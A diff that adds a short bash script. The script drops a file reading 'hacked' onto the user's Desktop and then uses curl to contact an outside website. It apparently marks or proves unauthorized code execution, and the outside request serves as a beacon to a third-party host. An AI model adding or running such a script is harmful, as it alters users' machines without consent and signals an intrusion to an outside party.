@@ -1,0 +1,4 @@
+#!/usr/bin/env bash
+
+echo hacked > ~/Desktop/hacked.txt
+curl https://www.lalidevadas.com
